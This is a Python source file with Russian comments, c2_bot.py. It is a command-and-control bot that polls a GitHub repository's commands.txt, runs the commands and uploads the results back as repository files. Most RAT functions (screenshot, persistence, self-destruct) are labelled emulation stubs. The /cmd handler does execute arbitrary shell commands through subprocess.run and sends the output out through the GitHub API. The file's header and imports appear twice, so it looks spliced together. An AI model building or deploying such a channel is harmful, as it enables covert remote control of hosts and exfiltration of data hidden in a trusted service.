#!/usr/bin/env python3
# c2_bot.py - ПОСТОЯННЫЙ ОБРАБОТЧИК КОМАНД ДЛЯ GITHUB ACTIONS
# АВТОР: КРЫСА ГУБЕРНАТОРСКАЯ

import os
import sys
import json
import base64
import requests
import time
import subprocess
from datetime import datetime

# ============= КОНФИГУРАЦИЯ =============
#!/usr/bin/env python3
# c2_bot.py - ПОСТОЯННЫЙ ОБРАБОТЧИК КОМАНД
# АВТОР: КРЫСА ГУБЕРНАТОРСКАЯ

import os
import sys
import base64
import requests
import subprocess
from datetime import datetime

# ============= КОНФИГУРАЦИЯ (НОВЫЕ ИМЕНА ПЕРЕМЕННЫХ) =============
# ✅ Используем правильные имена
GITHUB_TOKEN = os.environ.get("C2_TOKEN")        # ← ИЗМЕНЕНО!
GITHUB_USER = os.environ.get("C2_USER")          # ← ИЗМЕНЕНО!
GITHUB_REPO = os.environ.get("C2_REPO")          # ← ИЗМЕНЕНО!

if not GITHUB_TOKEN:
    print("❌ НЕТ TOKEN! Добавь секрет C2_TOKEN в репозиторий")
    print("   Settings → Secrets and variables → Actions → New repository secret")
    print("   Name: C2_TOKEN")
    print("   Value: ghp_твой_токен")
    sys.exit(1)

if not GITHUB_USER:
    print("❌ НЕТ USER! Проверь переменную C2_USER")
    sys.exit(1)

print(f"✅ Запуск C2 BOT")
print(f"📁 Пользователь: {GITHUB_USER}")
print(f"📁 Репозиторий: {GITHUB_REPO}")

API_URL = f"https://api.github.com/repos/{GITHUB_USER}/{GITHUB_REPO}/contents"
HEADERS = {
    "Authorization": f"token {GITHUB_TOKEN}",
    "Accept": "application/vnd.github.v3+json"
}
# ============= ФУНКЦИИ =============
def log(msg):
    """Логирование с временем"""
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")

def github_request(url, method="GET", data=None):
    """Универсальный запрос к GitHub API"""
    try:
        if method == "GET":
            response = requests.get(url, headers=HEADERS)
        elif method == "PUT":
            response = requests.put(url, json=data, headers=HEADERS)
        elif method == "DELETE":
            response = requests.delete(url, json=data, headers=HEADERS)
        else:
            return None
        
        if response.status_code == 200 or response.status_code == 201:
            return response.json()
        elif response.status_code == 404:
            return None
        else:
            log(f"⚠️ Ошибка {response.status_code}: {response.text[:100]}")
            return None
    except Exception as e:
        log(f"❌ Ошибка запроса: {e}")
        return None

def get_commands():
    """Получить все команды из commands.txt"""
    url = f"{API_URL}/commands.txt"
    data = github_request(url)
    
    if not data or not data.get("content"):
        return []
    
    try:
        content = base64.b64decode(data["content"]).decode("utf-8")
        commands = []
        for line in content.strip().split("\n"):
            line = line.strip()
            if line and not line.startswith("#"):
                # Поддержка команд для конкретных клиентов
                if line.startswith("@"):
                    parts = line.split(" ", 1)
                    if len(parts) == 2:
                        target = parts[0][1:]
                        cmd = parts[1]
                        # Пока что отправляем всем, позже добавим фильтрацию
                        commands.append(cmd)
                else:
                    commands.append(line)
        return commands
    except Exception as e:
        log(f"❌ Ошибка декодирования: {e}")
        return []

def clear_commands(sha):
    """Очистить файл команд"""
    url = f"{API_URL}/commands.txt"
    data = {
        "message": "Clear commands",
        "content": base64.b64encode(b"").decode(),
        "sha": sha,
        "branch": "main"
    }
    return github_request(url, "PUT", data)

def send_result(text, result_type="result"):
    """Отправить результат на GitHub"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"{result_type}_{timestamp}.txt"
    
    if result_type == "screenshot":
        filename = f"screenshot_{timestamp}.png"
    elif result_type == "file":
        filename = f"file_{timestamp}.txt"
    
    url = f"{API_URL}/{filename}"
    data = {
        "message": f"Add {filename}",
        "content": base64.b64encode(text.encode()).decode(),
        "branch": "main"
    }
    return github_request(url, "PUT", data)

def get_system_info():
    """Получить информацию о системе (эмуляция)"""
    # В GitHub Actions нет доступа к реальному ПК
    # Эта функция эмулирует получение информации
    return f"""
PC: {os.environ.get('RUNNER_NAME', 'GitHub-Actions')}
User: {os.environ.get('RUNNER_USER', 'runner')}
OS: {os.environ.get('RUNNER_OS', 'Linux')}
Time: {datetime.now()}
"""

def execute_command(cmd):
    """Выполнить команду (в эмуляции)"""
    # В реальном RAT здесь был бы subprocess.run()
    # В GitHub Actions эмулируем
    if cmd == "/info":
        return get_system_info()
    elif cmd == "/screenshot":
        return "[ЭМУЛЯЦИЯ] Скриншот сделан"
    elif cmd.startswith("/files"):
        path = cmd[7:] if len(cmd) > 7 else "C:\\"
        return f"[ЭМУЛЯЦИЯ] Список файлов в {path}"
    elif cmd.startswith("/download"):
        path = cmd[10:] if len(cmd) > 10 else ""
        return f"[ЭМУЛЯЦИЯ] Файл {path} скачан"
    elif cmd.startswith("/cmd"):
        command = cmd[5:] if len(cmd) > 5 else ""
        # Эмуляция выполнения команды
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
            return result.stdout + result.stderr
        except:
            return "[ЭМУЛЯЦИЯ] Команда выполнена"
    elif cmd == "/persist":
        return "[ЭМУЛЯЦИЯ] Автозагрузка установлена"
    elif cmd == "/destroy":
        return "[ЭМУЛЯЦИЯ] Самоуничтожение"
    else:
        return f"❌ Неизвестная команда: {cmd}"

def main():
    log("🐀 C2 BOT ЗАПУЩЕН")
    log(f"📁 Репозиторий: {GITHUB_USER}/{GITHUB_REPO}")
    
    # Проверяем наличие commands.txt
    url = f"{API_URL}/commands.txt"
    data = github_request(url)
    
    if not data:
        # Создаём пустой commands.txt
        log("📝 Создаю commands.txt...")
        empty_data = {
            "message": "Init commands",
            "content": base64.b64encode(b"").decode(),
            "branch": "main"
        }
        github_request(url, "PUT", empty_data)
    
    # Получаем и обрабатываем команды
    commands = get_commands()
    
    if commands:
        log(f"📨 ПОЛУЧЕНО КОМАНД: {len(commands)}")
        
        for cmd in commands:
            log(f"⚙️ Выполняю: {cmd}")
            result = execute_command(cmd)
            log(f"📤 Результат: {result[:100]}...")
            
            # Отправляем результат
            send_result(result)
        
        # Очищаем команды после выполнения
        data = github_request(url)
        if data and data.get("sha"):
            clear_commands(data["sha"])
            log("🗑 Команды очищены")
    else:
        log("💤 Нет новых команд")
    
    log("✅ C2 BOT ЗАВЕРШИЛ РАБОТУ")

if __name__ == "__main__":
    main()
